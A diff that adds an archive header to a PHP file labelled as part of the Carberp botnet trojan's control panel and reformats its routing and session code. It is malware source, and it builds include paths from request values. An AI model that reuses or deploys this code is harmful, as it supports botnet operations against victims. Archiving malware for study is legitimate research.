@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 setlocale(LC_ALL,"ru_RU.UTF-8");
@@ -41,7 +52,8 @@ unset($_GET);
 
 if(empty($Cur['page']) || $Cur['page'] < 0) $Cur['page'] = 0;
 
-if(file_exists('scripts/'.$Cur['to'].'/'.$Cur['go'].'.php')){	//$config = file_exists('includes/config.json') ? json_decode(file_get_contents('includes/config.json'), 1) : '';
+if(file_exists('scripts/'.$Cur['to'].'/'.$Cur['go'].'.php')){
+	//$config = file_exists('includes/config.json') ? json_decode(file_get_contents('includes/config.json'), 1) : '';
 	include_once('scripts/'.$Cur['to'].'/'.$Cur['go'].'.php');
 	exit;
 }
@@ -76,9 +88,11 @@ $smarty->allow_php_tag = true;
 
 session_start();
 
-if(isset($_SESSION['user']->PHPSESSID)){	if(empty($Cur['to'])) $Cur['to'] = 'admins';
+if(isset($_SESSION['user']->PHPSESSID)){
+	if(empty($Cur['to'])) $Cur['to'] = 'admins';
 	if(empty($Cur['go'])) $Cur['go'] = 'index';
-}else{	if(empty($Cur['to'])) $Cur['to'] = 'accounts';
+}else{
+	if(empty($Cur['to'])) $Cur['to'] = 'accounts';
 	if(empty($Cur['go'])) $Cur['go'] = 'authorization';
 }
 
